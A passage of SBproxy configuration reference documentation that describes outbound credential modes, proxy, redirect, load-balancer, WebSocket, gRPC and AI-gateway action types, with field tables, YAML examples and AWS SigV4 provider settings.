lowercases every key, applies the same property-key syntax as request capture,
rejects duplicates after normalization, and rejects more than five entries.
Redaction runs before promotion, so a configured sensitive key contributes the
literal `[redacted]` value rather than its original value. Each promoted key
adds a durable grouping dimension and can increase rollup cardinality. These
properties are not exported as arbitrary Prometheus labels. Query a promoted
dimension through `GET /api/usage/spend?...&group_by=property:<key>`.

### outbound_credential

`outbound_credential` decides what credential SBproxy presents to the upstream, so the agent or client never holds a per-upstream secret. The `type` field picks one of three modes.

| `type` | What it does |
|--------|--------------|
| `token_exchange` | RFC 8693: exchanges the caller's inbound token for one scoped to the upstream. |
| `client_credentials` | OAuth 2.0 client-credentials grant against a token endpoint. |
| `vault_secret` | A static secret resolved from the vault and formatted as a header. |

`token_exchange` fields:

| Field | Type | Default | Description |
|-------|------|---------|-------------|
| `token_endpoint` | string | required | Endpoint that performs the exchange. |
| `audience` | string | required | Audience requested for the exchanged token. |
| `scope` | string | unset | Optional requested scope. |
| `subject_token_issuers` | list | required | Issuer URLs (`iss`) whose subject tokens this origin will exchange. |
| `allowed_audiences` | list | required | Audiences this origin may request. Must contain `audience`. |
| `act_depth_cap` | int | `4` | Maximum `act` delegation-chain depth on the subject token. |
| `client_id` | string | unset | Client id for authenticating to the token endpoint. |
| `client_secret` | string | unset | Vault reference for the client secret. |
| `dpop` | object | unset | RFC 9449 sender constraint. See [outbound-dpop.md](outbound-dpop.md). |

Both allowlists are required and both must be non-empty. Token exchange is a delegation primitive: it takes whatever identity walked in the front door and mints something an upstream will honor. An empty list is refused at config compile rather than read as "any", because "exchange any token for access to any audience" is not a default worth having. There is no wildcard entry; enumerate the issuers and audiences the origin actually delegates to.

```yaml
origins:
  "api.example.com":
    action:
      type: proxy
      url: https://backend.internal
    outbound_credential:
      type: token_exchange
      token_endpoint: https://idp.example.com/token
      audience: https://backend.internal
      subject_token_issuers:
        - https://idp.example.com
      allowed_audiences:
        - https://backend.internal
```

A config that omits either list fails to compile with the origin and the missing key named:

```text
origin api.example.com: outbound_credential: token_exchange: `subject_token_issuers` is empty,
which denies every subject token. List the issuer URLs (the subject token's `iss`) this origin
accepts, for example `subject_token_issuers: ["https://idp.example.com"]`
```

---

## Actions

The `action` block defines what the proxy does with a matched request. The `type` field selects the handler.

### proxy

Forward requests to an upstream URL. The most common action type, and the right choice when SBproxy sits in front of an existing backend.

```yaml
origins:
  "api.example.com":
    action:
      type: proxy
      url: https://backend.internal:8080
      strip_base_path: false
      preserve_query: true
```

| Field | Type | Default | Description |
|-------|------|---------|-------------|
| `url` | string | required | Upstream URL to forward requests to |
| `strip_base_path` | bool | false | Strip the matched origin path before forwarding |
| `preserve_query` | bool | false | Forward the original query string to the upstream |
| `host_override` | string | unset | Override the upstream `Host` header. Default is the upstream URL's hostname (so vhost-routed services like Vercel, Cloudflare-fronted origins, S3, ALBs work without configuration). See [Host header semantics](#host-header-semantics). |
| `sni_override` | string | unset | Override the SNI server name sent during the upstream TLS handshake (and the cert verification target). Use when the cert's hostname differs from the URL host. See [Origin overrides](#origin-overrides). |
| `resolve_override` | string | unset | Pin the upstream connect address, bypassing DNS for the URL host. Accepts `ip`, `ip:port`, `[ipv6]:port`, or `host:port`. Equivalent to `curl --connect-to`. See [Origin overrides](#origin-overrides). |
| `service_discovery` | object | unset | DNS-based service discovery. Re-resolves the upstream hostname on a TTL. See [Service discovery](#service-discovery). |
| `disable_forwarded_host_header` | bool | false | Suppress the `X-Forwarded-Host` header that the proxy would otherwise set to the client's original `Host` whenever it rewrites the upstream `Host`. |
| `disable_forwarded_for_header` | bool | false | Suppress `X-Forwarded-For` (the client IP appended to the chain). |
| `disable_real_ip_header` | bool | false | Suppress `X-Real-IP`. |
| `disable_forwarded_proto_header` | bool | false | Suppress `X-Forwarded-Proto` (`http`/`https`). |
| `disable_forwarded_port_header` | bool | false | Suppress `X-Forwarded-Port` (the listener port). |
| `disable_forwarded_header` | bool | false | Suppress the RFC 7239 `Forwarded` header. |
| `disable_via_header` | bool | false | Suppress the `Via: 1.1 sbproxy` header. |
| `retry` | object | unset | Upstream retry policy. See [Upstream retries](#upstream-retries). |
| `max_message_size` | int | 10485760 | Maximum WebSocket message payload in bytes when this origin carries an upgraded tunnel. Same default and `0` means no ceiling as the `websocket` action. See [websocket.md](websocket.md). |

The same `host_override` and `disable_*_header` flags are accepted on every URL-bearing action: `proxy`, `load_balancer` targets, `websocket`, `grpc` (via the `:authority` field), `graphql`, `a2a`, and `forward_auth`.

### static

![A static action answering with fixed body and headers next to a mock action templating the request back](assets/static-and-mock.gif)

([config](../examples/static-and-mock/))

Return a fixed response without proxying to any upstream. Good for health check endpoints, maintenance pages, and mock APIs.

```yaml
origins:
  "status.example.com":
    action:
      type: static
      status: 200
      content_type: application/json
      json_body:
        status: healthy
        version: "2.1.0"
        services:
          database: up
          cache: up
```

| Field | Type | Default | Description |
|-------|------|---------|-------------|
| `status` | int | 200 | HTTP status code (alias: `status_code`) |
| `content_type` | string | | Content-Type header |
| `body` | string | | Plain text or HTML body (alias: `text_body`) |
| `json_body` | object | | JSON body. Auto-sets Content-Type to application/json. Overrides `body`. |
| `headers` | map | | Additional response headers |

### redirect

Return an HTTP redirect. Common uses: domain migrations, HTTPS enforcement, URL shortening, large URL lookup tables.

```yaml
origins:
  "old.example.com":
    action:
      type: redirect
      url: https://new.example.com
      status: 302
      preserve_query: true
```

| Field | Type | Default | Description |
|-------|------|---------|-------------|
| `url` | string | required* | Redirect target URL. Required when `bulk_list` is unset. |
| `status` | int | 302 | HTTP status code (alias: `status_code`). |
| `preserve_query` | bool | false | Preserve original query string. |
| `bulk_list` | object | unset | Per-origin bulk redirect source. See [bulk-redirects.md](bulk-redirects.md). |

`bulk_list` accepts three source types: `inline` (rows embedded in YAML), `file` (CSV or YAML on disk; CSV detected by `.csv` suffix), and `url` (HTTPS document fetched at config-load). Per-row `status` and `preserve_query` overrides win when set; otherwise rows inherit the action's defaults. Unmapped paths fall through to the action's `url:` (or 404 when `url:` is empty).

```yaml
origins:
  "marketing.local":
    action:
      type: redirect
      status_code: 301
      preserve_query: true
      bulk_list:
        type: file
        path: /etc/sbproxy/marketing-redirects.csv
```

### echo

Return the incoming request as a JSON response. Handy for debugging proxy behavior, testing forward rules, and verifying that headers and auth are set up correctly. Echo takes no fields.

```yaml
origins:
  "debug.example.com":
    action:
      type: echo
```

### mock

Return a fixed JSON response for API mocking. Optionally injects an artificial delay so you can test slow-backend behavior.

```yaml
origins:
  "mock.example.com":
    action:
      type: mock
      status: 200
      body:
        ok: true
        message: "mocked"
      headers:
        X-Mock: "true"
      delay_ms: 250
```

| Field | Type | Default | Description |
|-------|------|---------|-------------|
| `status` | int | 200 | HTTP status code |
| `body` | object | `null` | JSON body returned to the client |
| `headers` | map | | Additional response headers |
| `delay_ms` | int | | Optional artificial delay in milliseconds |

### beacon

Return a 1x1 transparent GIF. Useful for tracking pixel endpoints. Beacon takes no fields.

```yaml
origins:
  "px.example.com":
    action:
      type: beacon
```

### load_balancer

Distribute traffic across multiple backend targets when you have several instances of a service.

```yaml
origins:
  "api.example.com":
    action:
      type: load_balancer
      algorithm: round_robin
      targets:
        - url: https://backend-1.internal:8080
          weight: 70
        - url: https://backend-2.internal:8080
          weight: 30
```

| Field | Type | Default | Description |
|-------|------|---------|-------------|
| `targets` | list | required | Backend targets. |
| `algorithm` | string \| object | `round_robin` | Routing algorithm (see below). |
| `strategy` | string | unset | Registered routing strategy name. The compiled strategy runs before `algorithm`; unknown names fail config compilation. See [Routing strategies](routing-strategies.md). |
| `strategy_config` | object | `{}` | Strategy-specific settings. Must be an object. |
| `lb_method` | string | unset | Compatibility marker for plugin routing. `plugin` requires `strategy`; `algorithm` remains the fallback. |
| `deployment_mode` | object | `{mode: normal}` | Deployment mode. See below. |
| `outlier_detection` | object | unset | Passive ejection policy. See [Outlier detection](#outlier-detection). |
| `locality` | object | `{min_pool_size: 2}` | Zone-locality tuning. `min_pool_size` deactivates the same-zone preference when the deployment-filtered pool is smaller than this. The pool is counted before health filtering, as Envoy counts cluster hosts for `min_cluster_size`, so a health flap can never toggle the stage on and off. The stage itself needs no block, only `proxy.zone` (or `SB_ZONE`) plus `targets[].zone` labels. See [Zone-aware routing](routing.md#distributing-traffic-the-load-balancer-action). |
| `max_message_size` | int | 10485760 | Maximum WebSocket message payload in bytes when a target carries an upgraded tunnel. Same default and `0` means no ceiling as the `websocket` action. See [websocket.md](websocket.md). |

Algorithms:

| Algorithm | Description |
|-----------|-------------|
| `round_robin` | Cycle through active targets in order (default). |
| `weighted_random` | Pick a target with probability proportional to its weight. |
| `least_connections` | Route to the target with the fewest in-flight requests. |
| `ip_hash` | Hash the client IP to a target (sticky by client). |
| `uri_hash` | Hash the request URI to a target (sticky by path). |
| `header_hash` | Hash a named request header. Configured as `algorithm: { header_hash: { header: X-User } }`. |
| `cookie_hash` | Hash a named cookie. Configured as `algorithm: { cookie_hash: { cookie: sid } }`. |
| `ring_hash` | Ketama-style consistent hashing over the configured targets. Configured as `algorithm: { ring_hash: { key: ip } }`; `key` accepts `ip` (default), `uri`, `{ header: X-User }`, or `{ cookie: sid }`, the same key material as the four hash algorithms above. |

The four modulus hash algorithms (`ip_hash`, `uri_hash`, `header_hash`, `cookie_hash`) hash over the currently eligible targets, so adding or removing a target reshuffles most keys. `ring_hash` builds a fixed ring of 160 virtual nodes per target over the configured pool, apportioned by target `weight`: removing one of N targets remaps roughly 1/N of keys, and an unhealthy target is handled by walking to the next healthy node on the ring, so a health flap moves only the keys the flapping target owned and they return when it recovers. The ring is deterministic across processes, so every replica sharing a config file maps a given key to the same target.

```yaml
origins:
  "api.example.com":
    action:
      type: load_balancer
      algorithm:
        ring_hash:
          key:
            cookie: session_id
      targets:
        - url: https://backend-1.internal:8080
        - url: https://backend-2.internal:8080
```

The `sticky:` block was removed. It parsed (`cookie_name`, `ttl`) and did nothing: no affinity cookie was ever issued. A config that still sets it fails to compile with an error naming the replacement. For cookie-based session affinity, use `ring_hash` keyed on the cookie your application already issues, as above.

The `targets[].zone` label routes. When the proxy knows its own zone (`proxy.zone`, or `SB_ZONE` when that is unset), selection prefers same-zone targets and spills across zones only when no same-zone target is healthy; a proxy with no zone identity ignores the labels and warns at boot. The label went through a removal on the way here: it originally parsed as display-only decoration, was refused at config compile once that became clear, and was re-introduced together with the enforcement. See [Zone-aware routing](routing.md#distributing-traffic-the-load-balancer-action) for the semantics and [`examples/multi-zone/`](../examples/multi-zone/) for a runnable drill.

When `strategy` is set, deployment, backup, priority, health, circuit-breaker, and outlier filters run first. The registered strategy receives only eligible targets. Returning no selection falls through to `algorithm`.

The production registry includes `first-healthy`, `lora`, `lora-aware`, `gpu-aware`, and `bandit`. `lora-aware` reads the adapter from `X-LoRA-Adapter` or `?adapter=` and matches it against `targets[].metadata.loaded_adapters`. `gpu-aware` selects the lowest valid numeric `targets[].metadata.gpu_utilization` in `[0.0, 1.0]`; it does not poll GPUs. `bandit` records real success and latency outcomes, with successful reward `1 / (1 + latency_seconds)` and failure reward `0`; it does not fabricate cost data. Empty request hints and hints over 256 bytes are ignored.

Bandit learning survives a compatible hot reload in the same process when the origin, strategy name, and ordered target URLs remain unchanged. A process restart resets it. State is bounded to 256 retained namespaces and 256 target arms per namespace. See [Routing strategies](routing-strategies.md) for configuration and fallback details.

Target fields:

| Field | Type | Default | Description |
|-------|------|---------|-------------|
| `url` | string | required | Backend URL. |
| `weight` | int | 1 | Weight used by weighted algorithms. |
| `backup` | bool | false | Reserved for fallback. Excluded from normal selection. |
| `group` | string | | Deployment group label (`blue`, `green`, `canary`). |
| `priority` | int | 5 | Routing priority (1 = highest, 10 = lowest). Read from `X-Priority` header when not set here. |
| `zone` | string | unset | Availability zone label, e.g. `us-east-1a`. When the proxy's own zone (`proxy.zone` or `SB_ZONE`) matches, this target is preferred; when no same-zone target is healthy, requests spill across zones. Ignored, with a boot warning, when the proxy has no zone identity. |
| `metadata` | object | `{}` | Strategy-specific JSON signals such as `loaded_adapters` or `gpu_utilization`. Limited to 64 entries per target and 64 bytes per key. |
| `health_check` | object | | Active health-check probe config. See [Active health checks](#active-health-checks). |
| `host_override` | string | unset | Override the upstream `Host` for this target. Default is the target URL's hostname. |
| `disable_*_header` | bool | false | Same per-header opt-outs as on `proxy` actions; see [Forwarding headers](#trusted-proxies-and-forwarding-headers). |

#### Blue-green deployments

Route 100% of traffic to the named active group. Targets must have a `group` field set to `blue` or `green`.

```yaml
action:
  type: load_balancer
  deployment_mode:
    mode: blue_green
    active: green
  targets:
    - url: https://blue.internal:8080
      group: blue
    - url: https://green.internal:8080
      group: green
```

#### Canary deployments

Route a configurable percentage of requests to canary targets (group `canary`); remaining traffic goes to primary targets.

```yaml
action:
  type: load_balancer
  deployment_mode:
    mode: canary
    weight: 10            # 10% to canary
  targets:
    - url: https://primary.internal:8080
    - url: https://canary.internal:8080
      group: canary
```

### websocket

Proxy WebSocket connections for real-time applications, chat systems, and streaming APIs. The action forwards the `Upgrade` request through the normal auth/policy/transform pipeline, and once the upstream answers `101` it relays bytes in both directions while parsing frame headers on the pipe: it never reads or buffers payload bytes, but it does enforce `max_message_size`, RFC 6455's 125-byte control-frame limit, and the `subprotocols` allowlist. See [websocket.md](websocket.md) for upgrade semantics and the exact enforcement points.

```yaml
origins:
  "ws.example.com":
    action:
      type: websocket
      url: wss://ws-backend.internal:8080
      subprotocols: [graphql-ws, graphql-transport-ws]
      max_message_size: 5242880
```

| Field | Type | Default | Description |
|-------|------|---------|-------------|
| `url` | string | required | Backend WebSocket URL (ws:// or wss://) |
| `subprotocols` | list | | Allowlist for `Sec-WebSocket-Protocol` negotiation. Empty leaves negotiation to the client and upstream; non-empty filters the client's offer, refuses an offer with no allowed subprotocol (`400`), and refuses an upstream selection outside the negotiated set (`502`). |
| `max_message_size` | int | 10485760 | Maximum message payload size in bytes (10 MB), enforced in both directions on the upgraded tunnel. A message declaring more payload than this closes the connection. |

### grpc

Proxy gRPC traffic for microservice architectures.

```yaml
origins:
  "grpc.example.com":
    action:
      type: grpc
      url: grpcs://grpc-backend.internal:50051
      tls: true
      authority: grpc-backend.internal
      timeout_secs: 30
```

| Field | Type | Default | Description |
|-------|------|---------|-------------|
| `url` | string | required | Backend gRPC URL (`grpc://`, `grpcs://`, `http://`, `https://`) |
| `tls` | bool | false | Force TLS regardless of URL scheme |
| `authority` | string | | Override the HTTP/2 `:authority` pseudo-header |
| `timeout_secs` | int | 30 | Request timeout in seconds |
| `grpc_web` | bool | false | Allow browser gRPC-Web clients (HTTP/1.1 with base64 or binary framing) to reach the native gRPC upstream. |
| `transcode` | object | unset | REST-to-gRPC transcoding: `descriptor_set` (path to a compiled protobuf `FileDescriptorSet`) and `routes[]`, each a `{method, path, grpc_method, body}` binding an HTTP route to a unary gRPC call. `path` uses `google.api.http`-style templates; `body` names the field the HTTP body decodes into, or is omitted (or `"*"`) to decode the whole body as the request message. |

`grpc_web` and `transcode` both read the gRPC message frames, so both send `grpc-accept-encoding: identity` upstream and neither supports gRPC message compression. There is no field to change that. Plain passthrough (neither field set) forwards frames untouched and is unaffected. Dedicated page: [grpc.md](grpc.md). Limits: [gRPC limits](routing.md#grpc-limits). Runnable at [`examples/grpc-h2c/`](../examples/grpc-h2c/).

### ai_proxy

Route requests across LLM providers with automatic failover, cost tracking, and content-based routing. Supports 70 native providers behind one OpenAI-compatible API; the model name passes straight through, so any model a provider serves is reachable. For full details, see [ai-gateway.md](ai-gateway.md) and [providers.md](providers.md).

```yaml
origins:
  "ai.example.com":
    action:
      type: ai_proxy
      providers:
        - name: openai
          api_key: ${OPENAI_API_KEY}
          models: [gpt-4o, gpt-4o-mini, gpt-4-turbo]
          default_model: gpt-4o-mini
        - name: anthropic
          api_key: ${ANTHROPIC_API_KEY}
          models: [claude-sonnet-4-20250514, claude-haiku-4-5]
      routing: fallback_chain
      allowed_models: [gpt-4o, gpt-4o-mini, claude-haiku-4-5]
      blocked_models: []
      max_body_size: 4194304
```

| Field | Type | Default | Description |
|-------|------|---------|-------------|
| `providers` | list | required | Configured upstream AI providers. |
| `routing` | string \| object | `round_robin` | Routing strategy. Either a flat string or `{strategy: ..., ...}`. |
| `context_window_fallbacks` | list | empty (trigger off) | Provider names to reroute to when a prompt overflows the model's context window. Names must match `providers[].name`. See [Typed fallback triggers](ai-llm-aware-resilience.md#typed-fallback-triggers). |
| `content_policy_fallbacks` | list | empty (trigger off) | Provider names to reroute to when a provider refuses on content-policy grounds. Names must match `providers[].name`. See [Typed fallback triggers](ai-llm-aware-resilience.md#typed-fallback-triggers). |
| `max_price_per_request` | number | unset (gate off) | Hard per-request price ceiling in USD. Each routing candidate on a token-priced chat surface (`/v1/chat/completions`, `/v1/messages`, `/v1/responses`) is priced before selection; candidates over the ceiling are dropped, and a fully excluded set refuses with `402`. Must be positive when set; a value at or below zero is refused at config load. The `x-sbproxy-max-price` request header tightens the ceiling for one request but can never raise it, and sending that header to a surface the estimate does not model returns `400`. See [Per-request price ceiling](ai-gateway.md#per-request-price-ceiling). |
| `model_groups` | list | `[]` | Named model groups. Each entry binds one public name callers send as `model` to a list of members, each naming a provider on this action, the upstream model id it serves, and its `weight` under `routing: weighted`. A group carries its own `routing:`, independent of the action's, and its members may serve different model ids. The group resolves before every model gate, so `blocked_models`, the credential's allowlist, the per-model rate limits, and the budget scope all judge the member's real model id. Six strategies are refused per group. See [Model groups](ai-gateway.md#model-groups). |
| `allowed_models` | list | empty (allow all) | Allow-list of model names. |
| `blocked_models` | list | | Block-list of model names. Takes precedence over allow-list. |
| `data_posture` | object | unset | Data-handling posture requirement: `require_zdr` (default `false`) and `allow_data_collection` (default `true`). A hard provider-eligibility filter applied before any routing strategy runs, composed with the per-request `x-sbproxy-require-zdr` / `x-sbproxy-disallow-data-collection` headers (most restrictive wins). A request left with no eligible provider fails closed naming the constraint and the excluded providers; a block that excludes every configured provider is refused at config load. See [ai-gateway.md](ai-gateway.md#provider-data-posture). |
| `max_body_size` | int | `67108864` (64 MiB) | Maximum request body size in bytes the gateway accepts, checked while the body arrives rather than once it is buffered. An oversize declared `Content-Length` is refused before the first read, and a chunked upload that declares nothing is refused on the chunk that crosses the cap. Either way the answer is `413` and no provider is contacted, so nothing reaches the response cache or the idempotency store. The same number bounds the buffered upstream response. Unset means 64 MiB rather than unlimited, `0` reads as unset, and values above 1 GiB are clamped to 1 GiB. |
| `max_message_size` | int | 10485760 | Maximum WebSocket message payload in bytes on `/v1/realtime` and any other upgraded tunnel this action carries. Same default and `0` means no ceiling as the `websocket` action. See [websocket.md](websocket.md). |
| `guardrails` | object | | Input/output guardrails pipeline. |
| `budget` | object | | Budget enforcement configuration. |
| `model_rate_limits` | map | | Per-model rate limit overrides keyed by model name. |
| `per_surface_rate_limits` | map | | Per-surface rate limit overrides keyed by AI surface label (`chat_completions`, `assistants`, `image_generation`, ...). |
| `max_concurrent` | map | | Maximum concurrent in-flight requests per provider. |
| `resilience` | object | | Per-provider circuit breaker, outlier detection, and active health probes. Also hosts the LLM-aware knobs (`retry_policy`, `cooldown_policy`, `llm_aware`, `content_policy_fallback`) and the streaming `pre_header_timeout_ms` budget; see [ai-llm-aware-resilience.md](ai-llm-aware-resilience.md). |
| `allow_request_timeout_override` | bool | `false` | Honor a caller's `x-sbproxy-timeout-ms` in place of the selected provider's `timeout_ms`. Off means the header is ignored rather than refused. Requires `max_request_timeout_ms`; the flag alone is refused at config load. Scope is the origin, so it applies to every caller and tenant routed here. |
| `max_request_timeout_ms` | int | unset | Ceiling in milliseconds on a caller's `x-sbproxy-timeout-ms`. A header above it is refused with 400 naming the accepted range, not clamped. Must be above zero. Bounds one attempt, so `max_retries` multiplies it. An honored header replaces the gateway's 30-second HTTP client default too, so a ceiling above 30000 does lengthen an attempt. |
| `cancel_on_half_close` | bool | `false` | Treat a downstream HTTP/1 half-close before any response byte as the client having left, and cancel the in-flight provider call. Off, the gateway declines to guess: RFC 9112 section 9.6 makes a polite half-close byte-for-byte identical to a client that walked away, and such a client keeps its generation until a write to it fails. Enable only when your clients never half-close after sending, since a half-closing client would then be cancelled falsely. HTTP/2 and reset detection are unaffected and always cancel. Scope is the origin. See [ai-gateway.md](ai-gateway.md#when-a-broken-connection-stops-the-meter). |
| `compression` | object | unset | Ordered AI context-compression policy. See [AI context compression](#ai-context-compression) and [ai-context-compression.md](ai-context-compression.md). |
| `reasoning` | string or object | `off` | Route policy for concise reasoning. Use `concise`, `off`, or `{budget: N}` with `N` greater than zero. |
| `shadow` | object | | Side-by-side eval: mirror each request to one or more shadow targets and log metrics. |
| `ai_policy` | object | | One sandboxed CEL expression over the AI decision pipeline (`expression`, `on_error`). See [ai-policy-cel.md](ai-policy-cel.md). |
| `cache_affinity` | object | unset | Prefer the provider that already holds a caller's warm prompt cache. Sits beside `routing:`, not inside it, because it layers over whatever strategy is configured rather than replacing one (except `fallback_chain`, `cascade`, `cost_quality`, and `routing_policy`, which own their ordering and are left alone). Fields: `ttl_secs` (default `300`) and `max_keys_per_provider` (default `1024`); both are refused at zero. Keys on the caller's `prompt_cache_key`, or `user` when that is absent, scoped to the tenant, credential, origin, and API surface. A preference, never a pin: an ineligible holder or a changed resolved model leaves the strategy's pick in place. Process-local and bounded. See [ai-gateway.md](ai-gateway.md#prompt-cache-affinity). |
| `usage_sinks` | list | `[]` | Destinations for completed-call usage records. The `ledger` sink (`path`, optional `signing_seed_hex`) writes a hash-chained, signable record. See [ai-usage-ledger.md](ai-usage-ledger.md). |
| `stream_include_usage` | bool | `false` | Ask an OpenAI-compatible provider to end a stream with a usage frame, by adding `stream_options.include_usage: true` to the outbound body. Off by default because it changes what callers receive: the provider appends one terminal chunk whose `choices` is `[]`, and a client that indexes `choices[0]` unconditionally throws on it. Added only for providers whose wire format is OpenAI's, on streaming chat completions, and only when the caller sent no `stream_options` of its own; Anthropic, Vertex, Bedrock, Cohere and Ollama have no such field, and some OpenAI-compatible servers answer 400 to an unknown body key. With it off, a stream carrying no usage frame is priced from a tokenizer estimate instead. See [ai-gateway.md](ai-gateway.md#asking-the-provider-for-a-usage-frame). |

Routing strategies: `round_robin`, `weighted`, `fallback_chain`, `random`, `lowest_latency`, `least_connections`, `cost_optimized`, `least_token_usage`, `prefix_affinity`, `peak_ewma`, `sticky` (accepted, behaves as `round_robin`; see [ai-gateway.md](ai-gateway.md#sticky)), `race`, `headroom`, `reset_aware`, `cascade`, `cost_quality`, `outcome_aware`, `semantic_route`. See [ai-gateway.md](ai-gateway.md#routing-strategies) for each; `outcome_aware` has its own page in [ai-outcome-aware-routing.md](ai-outcome-aware-routing.md). `cascade`, `cost_quality`, and `semantic_route` carry required settings, so each needs the object form; `semantic_route` written as a flat string is refused with an error naming the `routes:` and embedding-source keys it needs, and its exemplars are capped at config load: 64 routes, 64 exemplars per route, and 256 exemplar texts across every route combined, since each one is an embedding call on the request that builds the index. `token_rate` is refused at config load: it scores headroom against a per-provider token limit that no field declares, which makes it `least_token_usage` under another name. See [ai-gateway.md#token_rate-refused](ai-gateway.md#token_rate-refused).

Peak EWMA accepts the object form:

| Field | Type | Default | Description |
|-------|------|---------|-------------|
| `routing.strategy` | string | `round_robin` | Set to `peak_ewma` for power-of-two choices over decayed latency and in-flight cost. |
| `routing.half_life` | duration | `10s` | Maximum idle decay interval before a provider re-enters at pool-neutral cost. Accepts integer seconds or a human-readable duration such as `10s`. |

`default_model` is a per-provider field, not an action-level field. Set it on each `providers[]` entry.

#### AI provider fields (`providers[]`)

| Field | Type | Default | Description |
|-------|------|---------|-------------|
| `name` | string | required | Unique provider name used to reference this entry. |
| `provider_type` | string | inferred from `name` | Provider type (`openai`, `anthropic`, `google`, etc.). |
| `deployment` | string | required for `managed_model` | Canonical `proxy.model_host.deployments` ID. Valid only when `provider_type: managed_model`. |
| `api_key` | string | | API key used to authenticate with the upstream. |
| `accept_native_credentials_for` | string | unset | Explicitly allow this provider entry and its effective `base_url` to receive caller-owned native credentials for the named canonical provider, such as `openai`. Must match `provider_type` (or `name` when no type is set). Rejected for managed and locally served providers. |
| `base_url` | string | provider default | Override the upstream base URL. Validated at config load: non-`http(s)` schemes and private/loopback targets are rejected as SSRF risks unless `allow_private_base_url` is set. |
| `allow_private_base_url` | bool | `false` | Allow `base_url` to point at a loopback/private address (a local model server). The scheme check still applies. |
| `models` | list | `[]` | Models served by this provider; empty defers to the provider catalog. |
| `default_model` | string | | Model used when the request omits an explicit model. |
| `model_map` | map | `{}` | Logical to upstream model name mapping. |
| `weight` | int | 1 | Weight used by weighted routing strategies. |
| `priority` | int | unset | Priority used by priority routing (lower runs first). |
| `enabled` | bool | true | When false, this provider is skipped during routing. |
| `max_retries` | int | unset | Maximum retries on transient upstream failures. |
| `timeout_ms` | int | unset | Request timeout in milliseconds, measured from connect through the end of the response body, so it cuts a streaming completion mid-stream if the stream outlives it. To bound only how long a streaming request waits for the provider's response headers, and fail over when it elapses, set the action-level `resilience.pre_header_timeout_ms` instead. |
| `organization` | string | | Organization identifier for providers that scope keys per org. |
| `api_version` | string | | API version header value (e.g. for Anthropic and Azure OpenAI). |
| `no_prompt_training` | bool | `false` | Marks the provider safe for training-sensitive prompts. Requests carrying the `x-sbproxy-disallow-prompt-training: true` header only route to providers with this flag; a request with the header and no marked provider in the chain gets a 400 `no_compliant_provider`. |
| `service_tier` | string | unset | Upstream service tier this destination requests: `flex`, `standard`, or `priority`. Unset sends no tier field and the vendor serves on its own default. The operator's decision, not the caller's: a caller's `service_tier` is removed from every request and replaced by this value where it is set. To run two tiers of one vendor, declare two entries with the same `provider_type` and different tiers. A tier the provider catalog does not record for this vendor is refused at config load. See [ai-gateway.md](ai-gateway.md#service-tier). |
| `data_posture` | object | unset | Operator override of this entry's declared data-handling posture, consulted by the action-level `data_posture:` filter: `zdr: true` declares this deployment holds a zero-data-retention arrangement (the only thing that makes a vendor which retains by default eligible for `require_zdr`), and `retains_data` overrides the catalog's retention declaration in either direction. Unset keeps the provider catalog's declaration. See [ai-gateway.md](ai-gateway.md#provider-data-posture). |
| `on_key_failure` | enum | `fallback` | What happens when this provider rejects the request's own credential with a `401`/`403`. `fallback` retries the same provider once with `fallback_credential_id`; `fail_closed` returns the rejection to the caller untouched. Only ever applies to this entry's own `api_key`: a request carrying a caller-owned native credential never falls back. |
| `fallback_credential_id` | string | unset | Id of the operator-held credential to retry with when this entry's `api_key` is rejected. Names a record under `key_management.seed.credentials[]` (or one minted through the admin key plane), never a secret written here, and it is resolved per request through the key plane so a rotation lands without a config reload and a cross-tenant record is refused. Unset means `on_key_failure: fallback` behaves as `fail_closed`. See [multi-tenant.md](multi-tenant.md#when-a-tenants-provider-key-is-refused). |
| `aws_sigv4` | object | unset | Sign this provider's requests with AWS Signature Version 4, which is what Bedrock and SageMaker require in place of a bearer token. Presence of the block selects the signer. See [AWS SigV4 fields](#aws-sigv4-fields-providersaws_sigv4). |
| `bedrock_guardrail` | object | unset | Run one of your Bedrock guardrails inside the `Converse` generation instead of as a separate `ApplyGuardrail` call. Keys: `identifier` and `version` (both required, sent as `guardrailIdentifier` / `guardrailVersion`), and `trace` (bool, default `false`, asks AWS which policies fired so the block reason can name them). Refused on any provider entry that is not Bedrock-format. See [guardrails.md](guardrails.md#bedrock-guardrails-inline-on-the-converse-call). |

A `managed_model` provider must set a non-empty `deployment` and must not set
`api_key`, `base_url`, or the legacy `serve` block. Conversely, `deployment` is
rejected for every other provider type. Managed traffic resolves through the
deployment runtime rather than an operator-supplied upstream URL.

A provider entry sets `api_key` or `aws_sigv4`, never both: the signature
overwrites `Authorization`, so a static credential alongside it would be
discarded. `accept_native_credentials_for` is refused with `aws_sigv4` for the
same reason, since it substitutes a caller-owned key for an `api_key` a signed
provider does not use, and `aws_sigv4` is refused on a `serve:` or
`managed_model` entry because neither dials AWS.

`fallback_credential_id` is refused alongside `on_key_failure: fail_closed`,
and on a `serve:`, `managed_model`, or `aws_sigv4` entry: in each of those a
credential is named that can never be presented, which is a config that reads
as configured and does nothing.

#### AWS SigV4 fields (`providers[].aws_sigv4`)

| Field | Type | Default | Description |
|-------|------|---------|-------------|
| `region` | string | required | AWS region used for the credential scope. Independent of `base_url`: pointing the endpoint at a VPC endpoint or a private host does not change the region a signature is scoped to, matching an AWS SDK's `endpoint_url` override. When `base_url` is unset, this also fills the `{region}` placeholder in the provider catalog's default endpoint. |
| `service` | string | from `provider_type` | Signing service name in the credential scope. Defaults to `bedrock` and `sagemaker` for those provider types; required for any other. |
| `refresh_margin_secs` | int | `900` | Seconds before expiry at which a short-lived credential is refreshed. A refresh that fails inside this window is logged and retried on the next request while the cached credential keeps serving, until 600 seconds remain. Must be at least 600. |
| `credentials.source` | string | `default_chain` | One of `default_chain`, `static`, `assume_role`. |
| `credentials.access_key_id` | string | unset | AWS access key ID. Required by `static`, refused by the other sources. |
| `credentials.secret_access_key` | string | unset | AWS secret access key. Required by `static`, refused by the other sources. `${VAR}`, `vault://`, `awssm://`, `secret://`, and `file:` are dereferenced at config load; an unresolvable reference is a hard error. |
| `credentials.session_token` | string | unset | Session token for an already-issued short-lived key pair. Read by `static` only. SBproxy cannot renew a token it was handed; use `assume_role` for credentials that expire. |
| `credentials.role_arn` | string | unset | Role to assume. Required by `assume_role`, refused by the other sources. |
| `credentials.external_id` | string | unset | External ID demanded by the role's trust policy. Read by `assume_role` only. Held as a credential and never formatted by SBproxy, but not covered by the admin-config redaction pass, so supply it as a reference rather than an inlined literal. |
| `credentials.session_name` | string | `sbproxy` | Role session name recorded in CloudTrail. Read by `assume_role` only. |
| `credentials.session_duration_secs` | int | role default | Requested role session length. Read by `assume_role` only. |
| `credentials.profile` | string | unset | Named profile in the shared AWS config files. Read by `default_chain` and by the base identity `assume_role` starts from. |

